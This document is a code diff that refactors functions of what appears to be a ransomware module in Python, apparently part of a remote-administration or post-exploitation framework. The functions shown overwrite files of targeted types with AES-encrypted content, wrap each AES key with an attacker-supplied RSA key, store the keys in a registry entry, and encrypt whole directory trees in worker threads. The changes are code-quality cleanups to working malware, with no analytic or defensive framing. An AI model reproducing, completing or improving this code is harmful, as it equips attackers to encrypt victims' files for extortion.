@@ -58,12 +58,11 @@ def _threader(tasks):
                     method(task)
                 tasks.task_done()
             except:
-                if retries < 3:
-                    retries += 1
-                    time.sleep(1)
-                    continue
-                else:
+                if retries >= 3:
                     break
+                retries += 1
+                time.sleep(1)
+                continue
     except Exception as e:
         util.log("{} error: {}".format(_threader.__name__, str(e)))
 
@@ -161,19 +160,20 @@ def encrypt_file(filename, rsa_key):
     """
     try:
         if os.path.isfile(filename):
-            if os.path.splitext(filename)[1] in globals()['filetypes']:
-                if isinstance(rsa_key, Crypto.PublicKey.RSA.RsaKey):
-                    cipher = Crypto.Cipher.PKCS1_OAEP.new(rsa_key)
-                    aes_key = os.urandom(32)
-                    with open(filename, 'rb') as fp:
-                        data = fp.read()
-                    ciphertext = encrypt_aes(data, aes_key)
-                    with open(filename, 'wb') as fd:
-                        fd.write(ciphertext)
-                    key = base64.b64encode(cipher.encrypt(aes_key))
-                    util.registry_key(globals()['registry_key'], filename, key)
-                    util.log('{} encrypted'.format(filename))
-                    return True
+            if os.path.splitext(filename)[1] in globals()[
+                'filetypes'
+            ] and isinstance(rsa_key, Crypto.PublicKey.RSA.RsaKey):
+                cipher = Crypto.Cipher.PKCS1_OAEP.new(rsa_key)
+                aes_key = os.urandom(32)
+                with open(filename, 'rb') as fp:
+                    data = fp.read()
+                ciphertext = encrypt_aes(data, aes_key)
+                with open(filename, 'wb') as fd:
+                    fd.write(ciphertext)
+                key = base64.b64encode(cipher.encrypt(aes_key))
+                util.registry_key(globals()['registry_key'], filename, key)
+                util.log('{} encrypted'.format(filename))
+                return True
         else:
             util.log("File '{}' not found".format(filename))
     except Exception as e:
@@ -216,19 +216,18 @@ def encrypt_files(args):
     """
     try:
         target, _, rsa_key = args.partition(' ')
-        if os.path.exists(target):
-            if not isinstance(rsa_key, Crypto.PublicKey.RSA.RsaKey):
-                rsa_key = Crypto.PublicKey.RSA.importKey(rsa_key)
-            if not rsa_key.can_encrypt():
-                return "Error: RSA key cannot encrypt"
-            if os.path.isfile(target):
-                return encrypt_file(target, rsa_key)
-            if os.path.isdir(target):
-                globals()['threads']['iter_files'] = _iter_files(rsa_key, base_dir=target)
-                globals()['threads']['encrypt_files'] = _threader()
-                return "Encrypting files"
-        else:
+        if not os.path.exists(target):
             return "File '{}' does not exist".format(target)
+        if not isinstance(rsa_key, Crypto.PublicKey.RSA.RsaKey):
+            rsa_key = Crypto.PublicKey.RSA.importKey(rsa_key)
+        if not rsa_key.can_encrypt():
+            return "Error: RSA key cannot encrypt"
+        if os.path.isfile(target):
+            return encrypt_file(target, rsa_key)
+        if os.path.isdir(target):
+            globals()['threads']['iter_files'] = _iter_files(rsa_key, base_dir=target)
+            globals()['threads']['encrypt_files'] = _threader()
+            return "Encrypting files"
     except Exception as e:
         util.log("{} error: {}".format(encrypt_files.__name__, str(e)))
 
